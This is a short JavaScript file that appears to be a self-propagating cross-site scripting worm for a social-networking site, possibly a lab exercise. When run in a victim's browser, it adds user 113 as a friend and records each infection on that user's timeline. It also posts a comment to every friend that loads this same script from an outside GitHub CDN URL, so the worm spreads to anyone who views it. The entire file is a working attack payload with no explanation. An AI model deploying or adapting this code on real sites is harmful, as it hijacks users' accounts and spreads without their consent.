alert('WORMIES1');
$.get("add_friend.php", {'id': 113}); 
$.get("friends.php", (homies)=>{
    a = homies.split("?id="); 
    for(var i = 1; i < a.length; i++){
        b = a[i].split("'>")[0];
        $.get("timeline.php", {'id': 113}, (report)=>{
            if(!report.includes(b + " got wormed")){
                $.get("add_comment.php", {'id': 113, 'comment': b + " got wormed datetime="+ new Date(Date.now()).toLocaleString()}); 
                $.get("add_comment.php", {'id': b, 'comment': "<script src='https://gitcdn.link/repo/sxa7263/special-octo-dollop/main/wormies.js'></script>YOU GOT WORMED"});
            }
        });
    }
}
)
